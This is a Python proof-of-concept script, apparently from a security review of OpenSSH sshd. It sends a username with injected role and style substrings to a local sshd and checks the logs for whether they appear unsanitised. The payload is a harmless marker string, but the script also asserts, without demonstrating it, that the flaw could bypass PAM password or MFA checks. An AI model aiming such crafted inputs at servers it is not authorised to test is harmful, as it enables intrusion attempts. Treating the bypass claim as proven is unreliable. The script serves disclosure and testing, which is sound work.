#!/usr/bin/env python3
"""
PoC #5 — Unsanitised role/style Substrings Passed to PAM and setproctitle
==========================================================================
Finding : LOW  (README-sshd-security-flaws.md #9)
File    : auth2.c:289-326
Branch  : master (unfixed)

Vulnerability
-------------
When sshd receives an SSH2_MSG_USERAUTH_REQUEST packet it splits the
client-supplied username on '/' and ':' to extract optional role and style
substrings:

    if ((role = strchr(user, '/')) != NULL)
        *role++ = 0;
    if ((style = strchr(user, ':')) != NULL)
        *style++ = 0;

These raw, client-controlled substrings are then forwarded unsanitised to:

    mm_inform_authserv(service, style, role)   // crosses privsep boundary
    start_pam(ssh)                             // PAM receives the style
    setproctitle(...)                          // user part appears in ps
    debug("...user %s...", user)               // full string in debug log

No length or character-set check is performed on role or style before any
of these uses.  Because the code runs in the pre-authentication network
process, any connecting client can supply arbitrary role and style values.

Attack vector
-------------
An attacker sends a username of the form  user/ROLE:STYLE  where ROLE and
STYLE contain attacker-controlled content:

  * On PAM-enabled systems that use the style field to select a PAM service
    or module, a crafted style could bypass or alter authentication policy.
  * The raw strings cross the privilege-separation boundary into the
    monitor process (mm_inform_authserv) without sanitisation.
  * The strings appear verbatim in debug-level sshd log output, supporting
    log-injection attacks (see also PoC #6 for newline injection).
"""

import subprocess
import sys
import time
import os

TARGET_HOST = "127.0.0.1"
TARGET_PORT = 22

CRAFTED_ROLE  = "EVIDENCE_ROLE_INJECTED"
CRAFTED_STYLE = "EVIDENCE_STYLE_INJECTED"
# The SSH client sends this verbatim as the username field in USERAUTH_REQUEST.
CRAFTED_USER  = f"nonexistent/{CRAFTED_ROLE}:{CRAFTED_STYLE}"


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def sshd_running():
    r = subprocess.run(["ss", "-tlnp"], capture_output=True, text=True)
    return f":{TARGET_PORT}" in r.stdout


def recent_sshd_logs(n=40):
    """Return the n most recent sshd log lines, newest-last."""
    # Try journald first (available on systemd distros)
    r = subprocess.run(
        ["journalctl", "_COMM=sshd", f"-n{n}", "--no-pager", "--output=cat"],
        capture_output=True, text=True, timeout=5,
    )
    if r.returncode == 0 and r.stdout.strip():
        return r.stdout
    # Fall back to /var/log/auth.log
    try:
        with open("/var/log/auth.log") as f:
            lines = f.readlines()
            return "".join(lines[-n:])
    except OSError:
        return ""


def attempt_ssh(user):
    """Attempt an SSH connection with the given username.  Will fail auth."""
    return subprocess.run(
        [
            "ssh",
            "-o", "StrictHostKeyChecking=no",
            "-o", "BatchMode=yes",       # no interactive prompts
            "-o", "ConnectTimeout=5",
            "-p", str(TARGET_PORT),
            "-l", user,
            TARGET_HOST,
            "true",
        ],
        capture_output=True,
        text=True,
        timeout=10,
    )


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    print("=" * 60)
    print("PoC #5 — role/style injection via crafted SSH username")
    print("=" * 60)
    print()
    print(f"[*] Target       : {TARGET_HOST}:{TARGET_PORT}")
    print(f"[*] Username sent: {CRAFTED_USER!r}")
    print(f"    role part    : {CRAFTED_ROLE!r}   (after the '/')")
    print(f"    style part   : {CRAFTED_STYLE!r}  (after the ':')")
    print()

    if not sshd_running():
        print(f"[!] No service on port {TARGET_PORT}. Start sshd first.")
        sys.exit(1)

    baseline = set(recent_sshd_logs().splitlines())

    print("[*] Sending SSH2 USERAUTH_REQUEST with crafted username …")
    result = attempt_ssh(CRAFTED_USER)
    time.sleep(0.5)   # allow sshd to flush its log

    after_lines = recent_sshd_logs().splitlines()
    new_lines   = [l for l in after_lines if l not in baseline]

    evidence = [l for l in new_lines
                if CRAFTED_ROLE in l or CRAFTED_STYLE in l or CRAFTED_USER in l]

    print("[*] New sshd log entries after the attempt:")
    for line in new_lines:
        tag = "  <-- EVIDENCE" if line in evidence else ""
        print(f"    {line}{tag}")
    print()

    if evidence:
        print("[+] CONFIRMED — crafted role/style strings reached sshd log output.")
        print("    The server accepted and processed the client-supplied role and")
        print("    style without any sanitisation before logging and forwarding.")
    else:
        print("[~] role/style not visible at this log level.")
        print("    Tip: set  LogLevel DEBUG3  in sshd_config and restart sshd.")
        print("    The vulnerability is still present regardless of log level:")
        print("    mm_inform_authserv(service, style, role) sends the raw strings")
        print("    across the privilege-separation boundary unconditionally.")

    print()
    print("[*] Vulnerability flow (auth2.c):")
    print("    client sends username = 'victim/ROLE:STYLE'")
    print("    :289  role  = strchr(user, '/')  → 'ROLE:STYLE' (ptr into user)")
    print("    :290  *role++ = 0                → user is now 'victim'")
    print("    :292  style = strchr(user, ':')  → NULL (colon now in role)")
    print("    :294  style = strchr(role, ':')  → 'STYLE'")
    print("    :295  *style++ = '\\0'            → role is now 'ROLE'")
    print("    :286  debug('…user %s…', ORIGINAL_user)  [logged before split]")
    print("    :326  mm_inform_authserv(service, 'STYLE', 'ROLE')  ← privsep")
    print("    :316  start_pam(ssh)  ← PAM receives style on PAM-enabled systems")
    print()
    print("[*] Potential impact on PAM-enabled systems:")
    print("    Some PAM configurations use the 'style' field to select a service")
    print("    name or module path.  A crafted style value could alter which PAM")
    print("    stack is evaluated — potentially bypassing password or MFA checks.")
    print()
    print("[*] Fix: validate role/style contain only printable, non-whitespace")
    print("    ASCII before storing or forwarding them to privsep or PAM.")


if __name__ == "__main__":
    main()
